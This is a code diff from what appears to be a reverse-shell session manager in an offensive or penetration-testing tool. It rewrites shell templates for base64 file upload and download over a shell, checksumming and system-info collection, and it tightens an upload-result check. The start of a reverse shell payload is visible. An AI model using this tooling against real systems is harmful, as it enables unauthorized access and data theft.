@@ -26,32 +26,15 @@ WRAPPER_CODE = """
 echo -n "{start1}""{start2}";({code}) {decoder};echo {stop}
 """
 
-UPLOAD_FILE_CHUNK_CODE = """
-file=`mktemp`
-echo {chunk_b64} | base64 -d > $file
-echo DONE "$file"
-""".strip()
+UPLOAD_FILE_CHUNK_CODE = 'file=$(mktemp); echo {chunk_b64} | base64 -d > "$file"; echo DONE "$file"'
 
-UPLOAD_FILE_MERGE_CODE = """
-cat {files} > {filepath}
-rm {files}
-"""
+UPLOAD_FILE_MERGE_CODE = 'cat {files} > {filepath}; rm {files}'
 
-UPLOAD_FILE_CHECK_CODE = """
-which md5sum >/dev/null || echo no_md5sum
-md5sum {filepath} 
-"""
+UPLOAD_FILE_CHECK_CODE = 'which md5sum >/dev/null || echo no_md5sum; md5sum {filepath}'
 
-DOWNLOAD_FILE_CHUNK_CODE = """
-tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED
-"""
+DOWNLOAD_FILE_CHUNK_CODE = 'tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED'
 
-GET_BASICINFO_CODE = """
-for cmd in {cmds}
-do
-  echo "start$cmd|"$($cmd | base64 -w 0)"stop"
-done
-"""
+GET_BASICINFO_CODE = 'for cmd in {cmds}; do echo "start$cmd|"$($cmd | base64 -w 0)"stop"; done'
 
 REVERSE_SHELL_PAYLOAD = """
 if command -v php > /dev/null 2>&1; then
@@ -291,10 +274,11 @@ class ReverseShellSession(SessionInterface):
                         done_bytes=done_bytes,
                         max_bytes=len(content),
                     )
-            if "DONE" not in result:
+            result = result.strip()
+            if not result.startswith("DONE"):
                 raise exceptions.FileError("上传分块失败")
 
-            return result.strip().removeprefix("DONE").strip()
+            return result.removeprefix("DONE").strip()
 
         coros = [
             upload_chunk(content[i : i + chunk_size])
